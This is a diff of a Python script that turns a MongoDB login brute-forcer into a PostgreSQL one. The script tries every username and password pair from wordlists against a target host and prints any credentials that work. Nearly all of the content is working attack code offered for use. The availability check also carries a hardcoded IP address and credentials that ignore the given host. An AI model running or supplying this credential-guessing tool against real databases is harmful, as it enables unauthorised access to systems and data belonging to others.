@@ -1,12 +1,12 @@
 #!/usr/bin/python3
-''' postgress bruteforce script.
+''' Postgress bruteforce script.
 
 A script for bruteforcing postgress
 
 Test with the following commandline
 python3 postgress_brute.py 192.168.2.5  users.txt passwords.txt
 '''
-from pymongo import MongoClient, errors
+import psycopg2
 import sys
 from time import sleep
 
@@ -38,101 +38,66 @@ def execute_scan(host, userfile, passwordfile, port, connect_timeout, ssl):
     except Exception as FileError:
         print(FileError)
 
-    login_mongodb(host, users, passwords, port, connect_timeout, ssl)
+    login_postgress(host, users, passwords, port, connect_timeout, ssl)
 
 
-def check_mongodb(host, port, connect_timeout):
-    """Function for checking if there is mongodb database running."""
+def check_postgress(host, port, connect_timeout):
+    """Function for checking if there is postgress database running."""
     try:
-        # create connection string
-        con_str = f'{host}:{port}'
-        # attempt to create a client instance of PyMongo driver
-        client = MongoClient(host=[con_str],
-                             serverSelectionTimeoutMS=(connect_timeout*1000))
-        client.server_info()
-
-    except errors.ServerSelectionTimeoutError:
-        print('Time out')
-        return False
-    except Exception as err:
-        print("unknow MongoDB error")
-        print(err)
-        return False
-    else:
-        return True
-
-
-def login_mongodb(host, users, passwords, port, connect_timeout, ssl):
-    """Function for logging in to mongodb."""
-    # Check if MongoDB uses Authentication
-
-    # Create connection without user and passwords
-    con_str = f"mongodb://{host}:{port}"
-    print(con_str)
-    try:
-        client = MongoClient(con_str, serverSelectionTimeoutMS=(connect_timeout*1000)) # noqa E501
-        db = client.admin
-
-        db.command("serverStatus")
-        print("You are connected!")
-        print(f'No credentials needed for {host}')
-    except errors.ServerSelectionTimeoutError:
-        # if mongodb is not available a timeout error will be shown
-        # so brute force execution must be stopped
-        print('Time out error')
-    except errors.InvalidURI:
-        print("Invalid mongodb uri")
-    except Exception as err:
-        if str(err) == 'command serverStatus requires authentication':
-            print('MongoDB server requires autherisation')
-            for user in users:
-                for password in passwords:
-                    sleep(1)
-                    try:
-                        # create connection string
-                        con_str = f"mongodb://{user}:{password}@{host}:{port}"
-                        print(con_str)
-
-                        client = MongoClient(con_str, serverSelectionTimeoutMS=(connect_timeout*1000)) # noqa E501
-                        db = client.admin
-
-                        db.command("serverStatus")
-                        print("You are connected!")
-                        print(f'Credentials found: {user}:{password} on {host}') # noqa E501
-                        client.close()
-                    except errors.ServerSelectionTimeoutError:
-                        # if mongodb is not available a timeout error will be shown
-                        # so brute force execution must be stopped
-                        print('Time out error')
-                        break
-                    except errors.InvalidURI:
-                        print("Invalid mongodb uri")
-                        break
-                    except Exception as err:
-                        if str(err) == 'Authentication failed.':
-                            print('Wrong user id and password!!!')
-                        else:
-                            print("unknow MongoDB error")
-                            print(err)
-                            break
-                else:
-                    continue
-                break
+        # connect to the PostgreSQL server
+        conn = psycopg2.connect(host="192.168.2.8", user="postgres", password="postgress", port=5432, connect_timeout=1)
+       
+        if conn is not  None:
+            conn.close()
+            return True
+    except (Exception, psycopg2.DatabaseError) as error:
+        # print(error)
+        if 'password authentication failed' in str(error):
+            return True
         else:
-            print("unknow MongoDB error")
-            print(err)
+            return False
+
+
+def login_postgress(host, users, passwords, port, connect_timeout, ssl):
+    """Function for logging in to postgress."""
+    for user in users:
+        for password in passwords:
+            sleep(1)
+            try:
+                # connect to the PostgreSQL server
+                # print('Connecting to the PostgreSQL database...')
+                print(f'Trying with {user}:{password} on {host}')
+                conn = psycopg2.connect(host=host, user=user, password=password, port=port, connect_timeout=connect_timeout)
+                # conn = psycopg2.connect(host="192.168.2.8", port=5432, connect_timeout=1)
+
+                if conn is not None:
+                    print(f'connected with {user}:{password} on {host}')
+                    conn.close()
+            except (Exception, psycopg2.DatabaseError) as error:
+                # print(error)
+                if 'password authentication failed' in str(error):
+                    print('wrong userid and password')
+                elif 'Connection refused' in str(error):
+                    print('Connection refused')
+                    break
+                else:
+                    print(error)
+                    break
+        else:
+            continue
+        break
 
 
 if len(sys.argv) != 4:
     print("Not enough arguments:\n" +
-          'Usage: mongodb_login_brute.py target userfile passfile')
+          'Usage: postgress_brute.py target userfile passfile')
 else:
     host = sys.argv[1]
     users = sys.argv[2]
     passw = sys.argv[3]
     ssl = False
-    if check_mongodb(host, 27017, 3):
-        print('Mongodb available continue with bruteforcing')
-        execute_scan(host, users, passw, 27017, 1, ssl)
+    if check_postgress(host, 5432, 3):
+        print('postgress available continue with bruteforcing')
+        execute_scan(host, users, passw, 5432, 1, ssl)
     else:
-        print('No mongodb server available')
+        print('No postgress server available')
